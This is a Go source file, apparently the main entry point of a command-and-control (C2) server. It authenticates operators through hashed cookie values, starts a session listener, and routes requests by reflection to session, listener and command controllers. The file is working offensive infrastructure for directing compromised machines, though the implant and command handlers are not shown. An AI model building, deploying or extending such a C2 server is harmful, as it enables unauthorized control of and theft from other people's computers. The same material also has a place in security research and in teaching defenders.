package main

import (
	"Server/Public"
	"Server/SessionController"
	"Server/ToolBar"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"github.com/gin-gonic/gin"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"log"
	"os"
	"reflect"
)

func main() {
	if len(os.Args) != 4 {
		log.Fatal("Usage: Server [Port] [AccessKey] [Password]\nExample: Server 7777 1234 pass")
	}
	serverPort := os.Args[1]
	hash := md5.Sum([]byte(os.Args[2]))
	accessKey := hex.EncodeToString(hash[:])
	hash = md5.Sum([]byte(os.Args[3]))
	password := hex.EncodeToString(hash[:])
	fmt.Println("C2 Server have started, please use Client.")

	// 开启监听器
	SessionController.ListenerObj.RestartListener()

	gin.SetMode(gin.ReleaseMode)
	gin.DefaultWriter = io.Discard
	r := gin.Default()

	structMapping := map[string]interface{}{
		"Public.Update":                       Public.Update{},
		"ToolBar.SystemLog":                   ToolBar.SystemLog{},
		"ToolBar.ListenerConfig":              ToolBar.ListenerConfig{},
		"ToolBar.PendingSession":              ToolBar.PendingSession{},
		"SessionController.CommandController": SessionController.CommandController{},
	}

	// 路由
	r.POST("/", func(c *gin.Context) {
		// 检查 Cookie
		rAccessKey, err := c.Cookie("accessKey")
		if err != nil || rAccessKey != accessKey {
			ToolBar.WriteSystemLogInfo("C2 Server", "以错误的 AccessKey 访问路由: "+c.ClientIP(), "Alarm")
			return
		}
		username, err := c.Cookie("username")
		if err != nil {
			ToolBar.WriteSystemLogInfo("C2 Server", "以错误的 Cookie 访问路由: "+c.ClientIP(), "Alarm")
			return
		}
		rPassword, err := c.Cookie("password")
		if err != nil || rPassword != password {
			ToolBar.WriteSystemLogInfo("C2 Server", "以错误的 Cookie 访问路由: "+c.ClientIP(), "Alarm")
			return
		}

		packageName := c.Query("packageName")
		structName := c.Query("structName")
		funcName := c.Query("funcName")

		if funcName == "Login" {
			c.String(200, "success")
			ToolBar.WriteSystemLogInfo(username, "用户登录", "SystemLog")
			return
		}

		// 反射调用
		structObj := structMapping[packageName+"."+structName]
		structType := reflect.TypeOf(structObj)
		funcObj, exist := structType.MethodByName(funcName)
		if exist {
			args := []reflect.Value{reflect.ValueOf(structObj), reflect.ValueOf(username), reflect.ValueOf(c)}
			funcObj.Func.Call(args)
		}
	})

	r.GET("/", func(c *gin.Context) {
		ToolBar.WriteSystemLogInfo("C2 Server", "未以 POST 请求访问路由: "+c.ClientIP(), "Alarm")
		return
	})

	r.Run(":" + serverPort)
}
